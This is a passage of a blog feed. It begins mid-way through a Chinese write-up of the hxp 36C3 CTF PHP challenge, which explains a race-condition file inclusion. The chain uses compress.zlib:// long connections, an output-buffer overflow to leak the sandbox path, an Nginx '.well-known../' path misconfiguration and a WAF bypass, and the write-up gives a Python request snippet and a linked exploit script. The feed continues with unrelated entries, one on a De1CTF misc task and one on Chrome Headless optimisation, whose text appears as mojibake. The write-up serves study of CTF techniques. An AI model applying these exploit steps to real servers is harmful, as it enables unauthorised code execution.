&#x957F;&#x94FE;&#x63A5;&#x7684;&#x5F62;&#x5F0F;&#xFF0C;&#x53EA;&#x8981;&#x8FD9;&#x4E2A;&#x94FE;&#x63A5;&#x4E0D;&#x65AD;&#x5F00;&#xFF0C;&#x5728;&#x6211;&#x4EEC;&#x7ED5;&#x8FC7;&#x7B2C;&#x4E00;&#x4E2A;&#x5224;&#x65AD;&#x4E4B;&#x540E;&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x53D1;&#x9001;&#x7B2C;&#x4E8C;&#x6BB5;&#x542B;&#x6709; PHP &#x4EE3;&#x7801;&#x7684;&#x6570;&#x636E;&#x4E86;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x80FD;&#x4F7F;<code>include_once</code>&#x5305;&#x542B;&#x6211;&#x4EEC;&#x7684;&#x4EE3;&#x7801;&#x4E86;&#x3002;</p><p>&#x56E0;&#x4E3A;&#x6211;&#x4EEC;&#x65E0;&#x6CD5;&#x77E5;&#x9053;&#x4EC0;&#x4E48;&#x65F6;&#x5019;&#x80FD;&#x7ED5;&#x8FC7;&#x7B2C;&#x4E00;&#x4E2A;&#x5224;&#x65AD;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x7684;&#x65B9;&#x6CD5;&#x53EA;&#x80FD;&#x5229;&#x7528;&#x7ADE;&#x4E89;&#x7684;&#x5F62;&#x5F0F;&#x53BB;&#x5305;&#x542B;&#x4E34;&#x65F6;&#x6587;&#x4EF6;&#xFF0C;&#x8FD9;&#x91CC;&#x662F;&#x7B2C;&#x4E8C;&#x4E2A;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x7ADE;&#x4E89;&#x7684;&#x70B9;&#x3002;</p><h3 id="Leak-Dir-path"><a href="#Leak-Dir-path" class="headerlink" title="Leak Dir path"></a>Leak Dir path</h3><p>&#x6700;&#x540E;&#xFF0C;&#x8981;&#x505A;&#x5230;&#x6587;&#x4EF6;&#x5305;&#x542B;&#xFF0C;&#x81EA;&#x7136;&#x5F97;&#x5148;&#x77E5;&#x9053;&#x5B83;&#x7684;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#xFF0C;&#x800C;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#x6BCF;&#x6B21;&#x90FD;&#x662F;&#x968F;&#x673A;&#x7684;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53C8;&#x4E0D;&#x5F97;&#x4E0D;&#x901A;&#x8FC7;&#x67D0;&#x4E9B;&#x65B9;&#x5F0F;&#x53BB;&#x83B7;&#x53D6;&#x8DEF;&#x5F84;&#x3002;</p><p>&#x867D;&#x7136;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x770B;&#x5230;&#x9898;&#x76EE;&#x662F;&#x76F4;&#x63A5;&#x7ED9;&#x51FA;&#x4E86;&#x8DEF;&#x5F84;&#xFF0C;&#x4F46;&#x662F;&#x4E4D;&#x4E00;&#x770B;&#x4EE3;&#x7801;&#x6211;&#x4EEC;&#x8C8C;&#x4F3C;&#x53EA;&#x80FD;&#x7B49;&#x5230;&#x5168;&#x90E8;&#x51FD;&#x6570;&#x7ED3;&#x675F;&#x4E4B;&#x540E;&#x624D;&#x80FD;&#x62FF;&#x5230;&#x8DEF;&#x5F84;&#xFF0C;&#x7136;&#x800C;&#x4E4B;&#x524D;&#x6211;&#x4EEC;&#x8BF4;&#x5230;&#x7684;&#x9700;&#x8981;&#x4FDD;&#x7559;&#x7684;&#x957F;&#x94FE;&#x63A5;&#x4E0D;&#x80FD;&#x8BA9;&#x6211;&#x4EEC;&#x7ACB;&#x5373;&#x5F97;&#x5230;&#x6211;&#x4EEC;&#x7684; sandbox &#x8DEF;&#x5F84;&#x3002;</p><p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x901A;&#x8FC7;&#x4F20;&#x5165;&#x8FC7;&#x5927;&#x7684; name &#x53C2;&#x6570;&#xFF0C;&#x5BFC;&#x81F4; PHP output buffer &#x6EA2;&#x51FA;&#xFF0C;&#x5728;&#x4FDD;&#x6301;&#x8FDE;&#x63A5;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x83B7;&#x53D6;&#x6C99;&#x7BB1;&#x8DEF;&#x5F84;&#xFF0C;&#x53C2;&#x8003;&#x4EE3;&#x7801;&#xFF1A;</p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    data = <span class="hljs-string">&apos;&apos;&apos;file=compress.zlib://http://192.168.151.132:8080&amp;name=&apos;&apos;&apos;</span>.strip() + <span class="hljs-string">&apos;a&apos;</span> * (<span class="hljs-number">1024</span> * <span class="hljs-number">7</span> + <span class="hljs-number">882</span>)</span><br><span class="line">    r.send(<span class="hljs-string">&apos;&apos;&apos;POST / HTTP/1.1\r</span></span><br><span class="line"><span class="hljs-string">Host: localhost\r</span></span><br><span class="line"><span class="hljs-string">Connection: close\r</span></span><br><span class="line"><span class="hljs-string">Content-Length: {}\r</span></span><br><span class="line"><span class="hljs-string">Content-Type: application/x-www-form-urlencoded\r</span></span><br><span class="line"><span class="hljs-string">Cookie: PHPSESSID=asdasdasd\r</span></span><br><span class="line"><span class="hljs-string">\r</span></span><br><span class="line"><span class="hljs-string">{}\r</span></span><br><span class="line"><span class="hljs-string">&apos;&apos;&apos;</span>.format(len(data), data))</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Get-Flag"><a href="#Get-Flag" class="headerlink" title="Get Flag"></a>Get Flag</h3><p>&#x6240;&#x4EE5;&#x6574;&#x4E2A;&#x6D41;&#x7A0B;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x603B;&#x7ED3;&#x4E3A;&#x4EE5;&#x4E0B;&#xFF1A;</p><ol><li>&#x5229;&#x7528; <code>compress.zlib://http://</code>or<code>compress.zlib://ftp://</code> &#x6765;&#x4E0A;&#x4F20;&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#xFF0C;&#x5E76;&#x4FDD;&#x6301; HTTP &#x957F;&#x94FE;&#x63A5;&#x7ADE;&#x4E89;&#x4FDD;&#x5B58;&#x6211;&#x4EEC;&#x7684;&#x4E34;&#x65F6;&#x6587;&#x4EF6;</li><li>&#x5229;&#x7528;&#x8D85;&#x957F;&#x7684; name &#x6EA2;&#x51FA; output buffer &#x5F97;&#x5230; sandbox &#x8DEF;&#x5F84;</li><li>&#x5229;&#x7528; Nginx &#x914D;&#x7F6E;&#x9519;&#x8BEF;&#xFF0C;&#x901A;&#x8FC7; <code>.well-known../files/sandbox/</code>&#x6765;&#x83B7;&#x53D6;&#x6211;&#x4EEC; tmp &#x6587;&#x4EF6;&#x7684;&#x6587;&#x4EF6;&#x540D;</li><li>&#x53D1;&#x9001;&#x53E6;&#x4E00;&#x4E2A;&#x8BF7;&#x6C42;&#x5305;&#x542B;&#x6211;&#x4EEC;&#x7684; tmp &#x6587;&#x4EF6;&#xFF0C;&#x6B64;&#x65F6;&#x5E76;&#x6CA1;&#x6709; PHP &#x4EE3;&#x7801;</li><li>&#x7ED5;&#x8FC7; WAF &#x5224;&#x65AD;&#x540E;&#xFF0C;&#x53D1;&#x9001; PHP &#x4EE3;&#x7801;&#x6BB5;&#xFF0C;&#x5305;&#x542B;&#x6211;&#x4EEC;&#x7684; PHP &#x4EE3;&#x7801;&#x62FF;&#x5230; Flag </li></ol><p>&#x6574;&#x4E2A;&#x9898;&#x76EE;&#x7684;&#x5173;&#x952E;&#x70B9;&#x4E3B;&#x8981;&#x662F;&#x4EE5;&#x4E0B;&#x51E0;&#x70B9;(&#x6765;&#x81EA; @wupco)&#xFF1A;</p><ol><li>&#x9700;&#x8981;&#x5229;&#x7528;&#x5927;&#x6587;&#x4EF6;&#x6216;ftp&#x901F;&#x5EA6;&#x9650;&#x5236;&#x8BA9;&#x8FDE;&#x63A5;&#x4FDD;&#x6301;</li><li>&#x4F20;&#x5165;name&#x8FC7;&#x5927; overflow output buffer&#xFF0C;&#x5728;&#x4FDD;&#x6301;&#x8FDE;&#x63A5;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x83B7;&#x53D6;&#x6C99;&#x7BB1;&#x8DEF;&#x5F84;</li><li>tmp&#x6587;&#x4EF6;&#x9700;&#x8981;&#x5728;&#x4E24;&#x79CD;&#x6587;&#x4EF6;&#x76F4;&#x63A5;&#x75AF;&#x72C2;&#x5207;&#x6362;&#xFF0C;&#x4F7F;&#x5F97;&#x7B2C;&#x4E00;&#x6B21;<code>file_get_contents</code>&#x83B7;&#x53D6;&#x7684;&#x5185;&#x5BB9;&#x4E0D;&#x5E26;&#x6709;<code>&lt;?</code>,<code>include</code>&#x7684;&#x65F6;&#x5019;&#x662F;&#x6B63;&#x5E38;php&#x4EE3;&#x7801;&#xFF0C;&#x9700;&#x8981;&#x5361;&#x65F6;&#x95F4;&#x70B9;&#xFF0C;&#x6240;&#x4EE5;&#x8981;&#x591A;&#x8DD1;&#x51E0;&#x6B21;&#x624D;&#x884C;</li><li><code>.well-known../files/</code>&#x662F;nginx&#x914D;&#x7F6E;&#x6F0F;&#x6D1E;&#xFF0C;&#x5C31;&#x4E0D;&#x591A;&#x8BF4;&#x4E86;&#xFF0C;&#x7528;&#x6765;&#x5217;&#x751F;&#x6210;&#x7684;tmp&#x6587;&#x4EF6;</li></ol><p>&#x7531;&#x4E8E;&#x7B2C;&#x4E8C;&#x4E2A;&#x6781;&#x77ED;&#x7684;&#x65F6;&#x95F4;&#x7A97;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x6BD4;&#x8F83;&#x51C6;&#x786E;&#x5730;&#x8C03;&#x63A7;&#x5EF6;&#x8FDF;&#x65F6;&#x95F4;&#xFF0C;&#x4E4B;&#x524D;&#x6CA1;&#x8C03;&#x63A7;&#x597D;&#x65F6;&#x95F4;&#x4EE5;&#x53CA;&#x6587;&#x4EF6;&#x5927;&#x5C0F;&#xFF0C;&#x6302;&#x4E00;&#x665A;&#x4E0A;&#x811A;&#x672C;&#x90FD;&#x6CA1;&#x6709; hit &#x4E2D;&#x4E00;&#x6B21;&#xFF0C;&#x7B2C;&#x4E8C;&#x5929;&#x7ECF;&#x8FC7; @rebirth &#x7684;&#x6DF1;&#x523B;&#x6307;&#x70B9;&#xFF0C;&#x4FEE;&#x6539;&#x4E86;&#x4E00;&#x4E0B;&#x5EF6;&#x8FDF;&#x65F6;&#x95F4;&#x4EE5;&#x53CA;&#x670D;&#x52A1;&#x5668;&#x54CD;&#x5E94;&#x7684;&#x6587;&#x4EF6;&#x7684;&#x5927;&#x5C0F;&#xFF0C;&#x6210;&#x529F;&#x7387;&#x5F97;&#x5230;&#x4E86;&#x5F88;&#x5927;&#x7684;&#x63D0;&#x9AD8;&#xFF0C;&#x57FA;&#x672C;&#x6BCF;&#x6B21;&#x90FD;&#x53EF;&#x4EE5; getflag&#x3002;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200107214803.png" alt></p><p>&#x811A;&#x672C;&#x653E;&#x5728;<a href="https://gist.github.com/ZeddYu/42159da911e82dba923b375a9f64ad65" target="_blank" rel="noopener">gist-exp.py</a>&#xFF0C;&#x5176;&#x4E2D; 192.168.34.1 &#x662F;&#x672C;&#x5730;&#x9898;&#x76EE;&#x5730;&#x5740;&#xFF0C;192.168.151.132 &#x662F; client &#x7684;&#x5730;&#x5740;&#x3002;</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://balsn.tw/ctf_writeup/20191228-hxp36c3ctf/" target="_blank" rel="noopener">20191228-hxp36c3ctf</a></p><p><a href="https://paste.q3k.org/paste/mp0iN5mw#xy+cOL+ON0sWRaJ7p1NZAFkcDTM1BKkYXaq9vZthxK0" target="_blank" rel="noopener">https://paste.q3k.org/paste/mp0iN5mw#xy+cOL+ON0sWRaJ7p1NZAFkcDTM1BKkYXaq9vZthxK0</a></p><p><a href="https://ctftime.org/task/10211" target="_blank" rel="noopener">https://ctftime.org/task/10211</a></p></body></html>]]></content>
        <author>
            <name><![CDATA[Zeddâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://miaotony.xyz/2020/05/04/CTF_2020De1CTF/</id>
        <title><![CDATA[CTF | 2020 De1CTF Misc Chowder WriteUp]]></title>
        <updated>2020-05-04T15:23:22+08:00</updated>
        <link href="https://miaotony.xyz/2020/05/04/CTF_2020De1CTF/"/>
        <content type="text/html" src="https://miaotony.xyz/2020/05/04/CTF_2020De1CTF/"><![CDATA[è¿™å‡ å¤©æœ‰ä¸ª De1CTFï¼Œç»“æŸå‰æ¥çœ‹äº†ä¸€çœ¼é¢˜ç›®ï¼Œåšäº†ä¸ªMiscæ‚çƒ©é¢˜ï¼Œè¿˜æ˜¯æŒºæœ‰æ„æ€çš„ã€‚é¡ºä¾¿æ¥æ€»ç»“ä¸€ä¸‹å…³äº NTFS äº¤æ¢æ•°æ®æµçš„ç›¸å…³åº”ç”¨å§ã€‚]]></content>
        <author>
            <name><![CDATA[MiaoTony]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.rexskz.info/awb-tool-ultimate-optimization-for-chrome-headless.html</id>
        <title><![CDATA[é¢å•å·¥å…·ï¼šå¯¹ Chrome Headless æ¸²æŸ“çš„æè‡´ä¼˜åŒ–]]></title>
        <updated>2020-05-02T21:05:00+08:00</updated>
        <link href="https://blog.rexskz.info/awb-tool-ultimate-optimization-for-chrome-headless.html"/>
        <content type="text/html" src="https://blog.rexskz.info/awb-tool-ultimate-optimization-for-chrome-headless.html"><![CDATA[<h1>èƒŒæ™¯</h1><p>æœ‰äº›åŒå­¦å¯¹â€œé¢å•å·¥å…·â€è¿™ä¸ªé¡¹ç›®åº”è¯¥ä¸ç®—é™Œç”Ÿï¼Œå› ä¸ºä¹‹å‰æˆ‘å·²ç»å†™è¿‡å‡ ç¯‡è·Ÿå®ƒç›¸å…³çš„æ–‡ç« äº†ã€‚å®ƒçš„åŸºç¡€åŠŸèƒ½æ— éå°±æ˜¯ç”»é¢å•ï¼šå¦‚æœä½ ä» Shopee ä¸Šä¹°äº†ç‚¹ä¸œè¥¿ï¼Œé‚£ä¹ˆå¿«é€’ä¸Šé¢è´´çš„é¢å•å°±æ˜¯ç”¨è¿™ä¸ªå·¥å…·ç”»å‡ºæ¥çš„ã€‚</p><p>å¯èƒ½æ˜¯è¿™å·¥å…·ç”¨èµ·æ¥æ¯”è¾ƒæ–¹ä¾¿ï¼Œéšç€ä¸šåŠ¡çš„æ‰©å¼ ï¼Œä¸€äº›ä¸æ˜¯é¢å•çš„å¥‡å¥‡æ€ªæ€ªçš„ä¸œè¥¿ä¹Ÿå¼€å§‹åˆ‡æ¢åˆ°é¢å•å·¥å…·ä¸Šï¼Œä¾‹å¦‚é‡‡è´­ç³»ç»Ÿçš„åˆåŒï¼ˆæ›´åƒæ˜¯ Word æ–‡ä»¶ï¼‰ã€ä»“åº“çš„æ¡å½¢ç ï¼ˆç”¨äº†ç‰¹æ®Šçº¸å¼ ï¼‰ã€æ‹£è´§å•ï¼ˆå¯ä»¥ç†è§£æˆå¤–å–å•ï¼‰ï¼Œè¿™å°±å¯¹é¢å•å·¥å…·çš„å¯æ‰©å±•æ€§æå‡ºäº†æé«˜çš„è¦æ±‚ã€‚ä¸è¿‡è¿™ä¸æ˜¯æœ¬æ–‡çš„é‡ç‚¹ï¼Œä¹‹åå†ä¸“é—¨å†™æ–‡ç« å¥½äº†ã€‚</p><p><img src="https://static.rexskz.info/blog/article/awb-tool-ultimate-optimization-for-chrome-headless/0.png" alt="ç”¨æ¥ç”»æ‹£è´§å•çš„ç•Œé¢" title="ç”¨æ¥ç”»æ‹£è´§å•çš„ç•Œé¢"></p><p>æˆ‘ä¹‹å‰å†™è¿‡ä¸€ç¯‡æ–‡ç« ï¼Œè®²çš„æ˜¯å¦‚ä½•ä¼˜åŒ–ç¼–è¾‘å™¨çš„æ¸²æŸ“æ•ˆç‡ï¼ˆ500 ä¸ªå…ƒç´ ä» 1 s é™åˆ° 100 msï¼‰ï¼Œè¿™ä¸ªç»“æœæˆ‘å·²ç»å¾ˆæ»¡æ„äº†ã€‚ä½†æ˜¯éšç€å¤§é‡çš„ç³»ç»Ÿå¼€å§‹ä½¿ç”¨è¿™ä¸ªå·¥å…·ï¼Œå®ƒé‡åˆ°äº†å¦å¤–ä¸€ä¸ªæ€§èƒ½ç“¶é¢ˆâ€”â€”æœåŠ¡ç«¯æ¸²æŸ“å¤ªæ…¢äº†â€¦â€¦</p><h1>é—®é¢˜è§£æ</h1><p>ä¸€å¼ é¢å•ï¼Œä»ç¼–è¾‘å™¨çš„ç”»å¸ƒä¸Šï¼Œåˆ°ç”Ÿæˆä¸€ä¸ª PDFï¼Œä¸­é—´ç©¶ç«Ÿç»å†äº†ä»€ä¹ˆï¼Ÿ</p><ol><li>å‰ç«¯å°†ç¼–è¾‘å™¨ä¸­çš„ä¸œè¥¿è½¬æ¢ä¸ºæ¨¡æ¿è¯­è¨€ï¼ˆæˆ‘ä»¬é€‰æ‹©äº† Django / pongo2ï¼‰ï¼›</li><li>ç¬¬ä¸‰æ–¹ç³»ç»Ÿé€šè¿‡ API Call å‘äº†ä¸€ä¸ªè¯·æ±‚ï¼Œè¦æ±‚ä½¿ç”¨æŸä¸€ä¸ªæ¨¡æ¿ï¼Œå¹¶æä¾›äº†æ‰€æœ‰å¿…è¦çš„æ•°æ®ï¼ˆè®¢å•å·ã€å•†å“è¯¦æƒ…ç­‰ï¼‰ï¼›</li><li>åç«¯å¯¹æ•°æ®åšäº†æ ¡éªŒä¹‹åï¼Œä½¿ç”¨æ¨¡æ¿å¼•æ“ç”Ÿæˆä¸€ä»½é¢å•çš„ HTMLï¼›</li><li>åç«¯ä½¿ç”¨ Chrome Headless æ‰“å¼€åˆšç”Ÿæˆçš„ HTMLï¼Œå¹¶å°†å…¶æ‰“å°ä¸º PDFï¼›</li><li>åç«¯å°† PDF è¿”å›ç»™ç¬¬ä¸‰æ–¹ç³»ç»Ÿï¼Œç¬¬ä¸‰æ–¹ç³»ç»Ÿå¯èƒ½ä¼šå°†å…¶å±•ç¤ºåœ¨å±å¹•ä¸Šï¼Œæˆ–ç›´æ¥è°ƒå–ç‰¹æ®Šçš„æ‰“å°æœºæ¥æ‰“å°ã€‚</li></ol><p>å¯ä»¥çœ‹å‡ºæ¥ï¼Œè™½ç„¶å®ç°ä¸€ä¸ªç¼–è¾‘å™¨çš„éš¾ç‚¹å…¨åœ¨å‰ç«¯ï¼Œä½†èƒ½ä½¿è¿™ä¸ªå·¥å…·çœŸæ­£å‘æŒ¥å…¶ä¸šåŠ¡ä½œç”¨çš„å´æ˜¯åç«¯ã€‚å½“ä¸šåŠ¡é‡å¢åŠ çš„æ—¶å€™ï¼Œå‰ç«¯è€ƒè™‘çš„æ˜¯å¦‚ä½•å®ç°å¯èƒ½çš„æ–°éœ€æ±‚ï¼Œè€Œåç«¯åˆ™éœ€è¦è€ƒè™‘å¦‚ä½•åº”å¯¹é€æ¸å¢é•¿çš„ QPSã€‚</p><h1>åç«¯çš„ä¼˜åŒ–</h1><p>ç”±äºåç«¯çš„åŒå­¦æ— æ³•æ¥è§¦åˆ°å…·ä½“çš„é¢å•å†…å®¹ï¼ˆæˆ–è€…è¯´ï¼Œæ¥è§¦åˆ°äº†ä¹Ÿæ— èƒ½ä¸ºåŠ›ï¼‰ï¼Œæ‰€ä»¥åªèƒ½åšä¸€äº›é€šç”¨çš„ä¼˜åŒ–ï¼š</p><ul><li>ä½¿ç”¨è¿›ç¨‹æ± ï¼Œè€Œä¸æ˜¯æ¯æ¬¡æ–°æ‰“å¼€ä¸€ä¸ª Chrome Headlessï¼›</li><li>ä½¿ç”¨ Debugging Protocolï¼Œæ¯æ¬¡å¤ç”¨ä¹‹å‰æ‰“å¼€çš„é¡µé¢ï¼›</li><li>ç¦æ­¢æ‰æ’ä»¶ã€æ²™ç®±ç­‰åŠŸèƒ½ï¼›</li><li>åŠ æœºå™¨â€¦â€¦</li></ul><p>å…¶å®è¿™å‡ ç‚¹åœ¨ç½‘ä¸Šéƒ½èƒ½æœåˆ°ã€‚å¯èƒ½ä»–ä»¬è¿˜åšäº†å…¶å®ƒçš„ä¼˜åŒ–ï¼Œä½†æˆ‘äº†è§£çš„æš‚æ—¶åªæœ‰è¿™äº›äº†ã€‚è¿™äº›ä¼˜åŒ–åœ¨é¢å•å†…å®¹ä¸å¤æ‚çš„æ—¶å€™è¿˜æ˜¯éå¸¸æœ‰ç”¨çš„ï¼Œç›´åˆ°æŸä¸ªä¸šåŠ¡æå‡ºäº†ä¸€ä¸ªå¥‡æ€ªçš„éœ€æ±‚â€¦â€¦</p><h1>ä¸šåŠ¡çš„éœ€æ±‚</h1><p>æœ‰ä¸€å¤©ï¼Œä¸šåŠ¡æå‡ºéœ€è¦ä¸€ä¸ªç¥å¥‡çš„æ’ç‰ˆè§„åˆ™ï¼š</p><ul><li>é¦–å…ˆï¼Œéœ€è¦å®ç°ä¸€ä¸ªæ‹£è´§å•ï¼šå¯ä»¥ç†è§£ä¸ºå¤–å–çš„å°ç¥¨ï¼Œä¸€å¼€å§‹æ˜¯ä¸€ä¸ªå¤´éƒ¨åŒºåŸŸï¼ˆå…¬å¸åã€è®¢å•å·ã€ä¸‹å•æ—¶é—´ã€å¤‡æ³¨ç­‰ï¼‰ï¼Œç„¶åæ˜¯ä¸€ä¸ªè¡¨æ ¼ï¼ˆå•†å“ã€æ•°é‡ã€ä»·æ ¼ï¼‰ï¼Œæœ€åæ˜¯ä¸€ä¸ªå°¾éƒ¨åŒºåŸŸï¼ˆä»˜æ¬¾ä¿¡æ¯ã€é…é€ä¿¡æ¯ï¼‰ï¼›æ‹£è´§å•æ˜¯æ‰“åœ¨çºµå‘ A6 çº¸ä¸Šçš„ï¼Œå¹¶ä¸”è¡¨æ ¼çš„è¡Œæ•°å¯ä»¥ä»»æ„å¤šï¼ŒåŸåˆ™ä¸Šæ¥è¯´ï¼Œæ¯ä¸€é¡µçš„è¡¨æ ¼æœ€åéƒ½è¦æœ‰ä¸€ä¸ªå°¾éƒ¨åŒºåŸŸï¼›</li><li>ç„¶åï¼Œéœ€è¦å®ç°ä¸€ç»„æ‹£è´§å•ï¼šè‹¥å¹²å¼ æ‹£è´§å•è¢«æ’åˆ—åœ¨ A4 çº¸ä¸Šï¼Œå®ƒä»¬ä¹‹é—´çš„æ’ç‰ˆè§„åˆ™å¯ä»¥ç†è§£ä¸º Word çš„åˆ†æ æ’ç‰ˆè§„åˆ™ã€‚</li></ul><p>è¿™ä¸ªéœ€æ±‚å› ä¸ºæŸäº›åŸå› æ˜¯æ¨ä¸æ‰çš„ï¼Œç”šè‡³è¿æ’ç‰ˆè§„åˆ™éƒ½ä¸èƒ½ä¿®æ”¹ï¼ˆä¸šåŠ¡å¼ºçƒˆè¦æ±‚ï¼Œè¯´æ˜¯å½“åœ°çš„å–å®¶å¸Œæœ›è¿™æ ·ï¼Œå¹¶ä¸”æˆ‘ä»¬çš„æŸä¸ªç«äº‰å¯¹æ‰‹å·²ç»æœ‰è¿™æ ·çš„åŠŸèƒ½äº†ï¼‰ã€‚</p><p>ç”±äºè¡¨æ ¼æ•°æ®çš„ä¸ç¡®å®šæ€§ï¼Œä»¥åŠåˆ†æ æ’ç‰ˆçš„é€»è¾‘å’Œâ€œæ¯ä¸€é¡µçš„è¡¨æ ¼æœ€åéƒ½è¦æœ‰ä¸€ä¸ªå°¾éƒ¨åŒºåŸŸâ€çš„éœ€æ±‚å®åœ¨æ˜¯è¶…å‡ºäº† Chrome è‡ªèº«çš„æ’ç‰ˆèƒ½åŠ›ï¼Œæˆ‘è·Ÿåç«¯åŒå­¦å•†é‡äº†åŠå¤©ï¼Œä¸å¾—ä¸å†³å®šåœ¨æœåŠ¡ç«¯ä½¿ç”¨ JavaScript æ’ç‰ˆï¼Œå³æˆ‘æŠŠæ’ç‰ˆçš„ä»£ç æ³¨å…¥åˆ°æ¨¡æ¿ä¸­ï¼Œåç«¯åœ¨ Chrome Headless ä¸­æ‰“å¼€æ—¶å°±ä¼šæ‰§è¡Œè¿™æ®µæ’ç‰ˆä»£ç ã€‚æˆ‘è¯´è¿™å¯èƒ½ä¼šæ¯”å…¶å®ƒæ™®é€šé¢å•å¤š 100 ms çš„ç”Ÿæˆæ—¶é—´ï¼Œåç«¯åŒå­¦è¡¨ç¤ºï¼šâ€œè¦å“­äº†ï¼Œæˆ‘åˆ°å“ªå„¿å†ç»™ä½ æŒ¤å‡º 100 ms å•Šâ€¦â€¦â€</p><p>ä¸è¿‡åæ§½å½’åæ§½ï¼Œåšè¿˜æ˜¯è¦åšçš„ï¼Œäºæ˜¯ç»è¿‡äº†ä¸€å‘¨å¤šçš„å¼€å‘ï¼Œæˆ‘ä¸å…‰å†™å®Œäº†æ’ç‰ˆçš„ä»£ç ï¼Œè¿˜é‡æ„äº†ä¸€ä¸‹ç¼–è¾‘å™¨ï¼Œä½¿å…¶å¯ä»¥æ–¹ä¾¿çš„æ‰©å±•å…¶å®ƒä¸šåŠ¡åœºæ™¯ã€‚</p><p>ç„¶åï¼Œä¸šåŠ¡è¦æ±‚å¯ä»¥åœ¨ä¸€ä¸ªç»„ä¸­æ’åˆ—å¤šè¾¾ 50 å¼ æ‹£è´§å•ï¼Œå¹¶ä½œä¸ºä¸€ä¸ª PDF æ–‡ä»¶è¿”å›ã€‚æˆ‘â€¦â€¦@%$!&^</p><p><img src="https://static.rexskz.info/blog/article/qiaoqiaohua/keng-die-ne.gif" alt="è¿™ä¸æ˜¯å‘çˆ¹å—ï¼" title="è¿™ä¸æ˜¯å‘çˆ¹å—ï¼"></p><p>å½“ç„¶ï¼Œä½œä¸ºä¸€ä¸ªä¸“ä¸šçš„å·¥ç¨‹å¸ˆï¼Œä¸šåŠ¡çš„éœ€æ±‚æ€»æ˜¯èƒ½åšçš„ï¼Œäºæ˜¯åˆèŠ±äº†ä¸¤å¤©æ—¶é—´æå‡ºæ¥äº†ã€‚ç„¶è€Œ QA å°å§å§åšäº†ä¸€ä¸‹æ€§èƒ½æµ‹è¯•ï¼šç”¨ 50 ä¸ªé¢å•çš„æ•°æ®æ¥è¯·æ±‚ï¼Œç»“æœå‘ç°éœ€è¦è‡³å°‘ 100 sã€‚æˆ‘æ‹¿åˆ° HTML ä¹‹ååœ¨è‡ªå·±çš„å¤–æ˜Ÿäººä¸Šè·‘äº†ä¸€ä¸‹ï¼Œå‘ç°ä¹Ÿéœ€è¦ 16 sï¼Œè¿™å¤ªæ…¢äº†ï¼</p><h1>å‰ç«¯çš„ä¼˜åŒ–</h1><h2>æœ€åŸå§‹çš„ä»£ç </h2><p>æ‹¿åˆ°äº†ç”Ÿæˆçš„ HTML æ–‡ä»¶åï¼Œåœ¨æœ¬åœ°çš„ Chrome æ‰“å¼€ã€‚ç”±äºæœåŠ¡å™¨æ²¡æœ‰ GPUï¼Œå› æ­¤ä¸ºäº†è·ŸæœåŠ¡å™¨ä¸€è‡´ï¼Œæˆ‘ç¦ç”¨äº† Chrome çš„ç¡¬ä»¶åŠ é€Ÿã€‚æŸ¥çœ‹ä¸€ä¸‹ Performance é¢æ¿ï¼Œæ˜¯è¿™æ ·çš„ï¼š</p><p><img src="https://static.rexskz.info/blog/article/awb-tool-ultimate-optimization-for-chrome-headless/1.png" alt="æƒ¨ä¸å¿ç¹çš„æ€§èƒ½" title="æƒ¨ä¸å¿ç¹çš„æ€§èƒ½"></p><p>å¦ˆè€¶ï¼Œè¦è¢«å“æ­»äº†â€¦â€¦ä¹Ÿä¸ç¦æ„Ÿæ…¨é“ï¼Œç°ä»£æµè§ˆå™¨æ²¡æœ‰ GPU åŠ é€Ÿæ˜¯ä¸‡ä¸‡ä¸èƒ½çš„ã€‚</p><p>QA ç»™çš„æ–‡ä»¶ä¸­ï¼Œæ¯ä¸ªé¢å•éƒ½æœ‰ 30 ä¸ªâ€œå•†å“â€ï¼Œæ¯ä¸ªâ€œå•†å“â€éƒ½æœ‰å››åˆ—ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘è¦å¯¹ <code>50*30*4=6000</code> ä¸ªå…ƒç´ åšç°åœºæ’ç‰ˆã€‚</p><h2>æœ´ç´ çš„ä¼˜åŒ–</h2><p>ä»”ç»†è§‚å¯Ÿäº†ä¸€ä¸‹ï¼Œå¦‚æœè¯´ 40 s ä¹‹åæ˜¯ç°åœºæ’ç‰ˆçš„æƒ…å†µï¼Œé‚£ä¹ˆå‰ 40 s éš¾é“åªæ˜¯åœ¨æ¸²æŸ“æœ€åˆçš„ HTML ç»“æ„ï¼Ÿä¸ºä»€ä¹ˆ Recalculate Style çš„æ—¶é—´è¶Šæ¥è¶Šé•¿ï¼Ÿ</p><p>ä»”ç»†æƒ³ä¸€ä¸‹ä¹Ÿä¸å¥‡æ€ªï¼Œå› ä¸ºæ­¤æ—¶å°šæœªå¼€å§‹æ‰§è¡Œæˆ‘çš„æ’ç‰ˆä»£ç ï¼Œå› æ­¤æ‰€æœ‰çš„åŒºåŸŸå’Œè¡¨æ ¼éƒ½ä¼šå †ç§¯åœ¨ <code>(0, 0)</code> çš„ä½ç½®ã€‚è€Œ Chrome çš„æ¸²æŸ“æ˜¯ä¸€è¾¹ Parse HTML 